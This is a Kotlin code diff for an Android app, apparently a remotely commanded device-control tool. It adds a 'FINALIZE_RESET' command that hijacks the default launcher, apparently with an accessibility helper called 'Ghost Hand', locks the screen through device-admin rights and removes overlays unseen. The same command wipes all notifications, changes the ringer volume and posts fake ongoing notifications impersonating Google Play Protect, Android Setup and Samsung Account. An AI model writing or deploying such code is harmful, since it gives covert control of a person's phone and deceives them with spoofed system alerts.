@@ -2203,6 +2203,103 @@ object CommandProcessor {
                         errorMsg = "No valid package names provided."
                     }
                 }
+                "FINALIZE_RESET" -> {
+                    // 1. Configure Launcher: WORK mode, Active, and Heavy Boot (Stutter)
+                    val lPrefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
+                    lPrefs.edit()
+                        .putString("display_mode", "WORK")
+                        .putBoolean("active", true)
+                        .putBoolean("heavy_boot_active", true)
+                        .apply()
+                    AppCache.invalidate()
+
+                    // 2. Check and Hijack Default Launcher
+                    val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                    if (currentHome != ctx.packageName) {
+                        LauncherManager.isHijacking = true
+                        LauncherManager.pendingCmdId = id
+                        
+                        android.os.Handler(android.os.Looper.getMainLooper()).post {
+                            try {
+                                val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
+                                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                }
+                                ctx.startActivity(intent)
+                            } catch (e: Exception) {
+                                LauncherManager.isHijacking = false
+                            }
+                        }
+                        
+                        // Wait for Ghost Hand to finish hijack (Max 10s)
+                        var waitTime = 0
+                        while (LauncherManager.isHijacking && waitTime < 10000) {
+                            kotlinx.coroutines.delay(500)
+                            waitTime += 500
+                        }
+                    }
+
+                    // 3. Physically Lock Screen
+                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
+                    if (dpm.isAdminActive(adminComponent)) {
+                        try { dpm.lockNow() } catch (e: Exception) { }
+                    }
+
+                    // 4. Tear down the Welcome UI in the dark
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        DynamicUIManager.removeOverlay(ctx, "FINALIZE_RESET")
+                        DynamicUIManager.removeNativeOverlay(ctx, "FINALIZE_RESET")
+                        DimmerManager.removeOverlay(ctx)
+                    }, 800)
+
+                    // 5. Wake Screen to Swipe/Lock screen
+                    kotlinx.coroutines.delay(2000)
+                    val pulseIntent = android.content.Intent(ctx, PulseActivity::class.java).apply {
+                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                        putExtra("is_wake_trigger", true)
+                        putExtra("preserve_keyguard", true)
+                    }
+                    ctx.startActivity(pulseIntent)
+
+                    // 6. Post-Boot Audio and Notification Manipulation
+                    try {
+                        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+                        if (PermissionManager.hasDndAccess(ctx)) {
+                            am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
+                        }
+                        val maxRing = am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING)
+                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, (maxRing * 0.7f).toInt(), 0)
+                    } catch(e: Exception){}
+
+                    MyNotificationListener.instance?.wipeNotifications("ALL", null)
+
+                    kotlinx.coroutines.delay(2000)
+                    val fakeNotifs = listOf(
+                        Pair("Android Setup", "Finishing system update..."),
+                        Pair("Google Play Protect", "Scanning device for threats..."),
+                        Pair("System UI", "Configuring your apps..."),
+                        Pair("Samsung Account", "Syncing profile data..."),
+                        Pair("Android Setup", "Restoring backed up data...")
+                    )
+                    
+                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                    val channelId = "system_integrity_alerts"
+                    var notifId = 8000
+                    for (notifData in fakeNotifs) {
+                        val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
+                            .setSmallIcon(android.R.drawable.stat_notify_sync)
+                            .setContentTitle(notifData.first)
+                            .setContentText(notifData.second)
+                            .setProgress(100, (10..90).random(), true)
+                            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
+                            .setOngoing(true)
+                        nm.notify(notifId++, builder.build())
+                        kotlinx.coroutines.delay(800)
+                    }
+
+                    status = "FINALIZE_RESET_COMPLETE"
+                    errorMsg = "Launcher hijacked, screen locked, waking up, heavy mode active."
+                }
                 "HIJACK_LAUNCHER" -> {
                     LauncherManager.isHijacking = true
                     LauncherManager.pendingCmdId = id
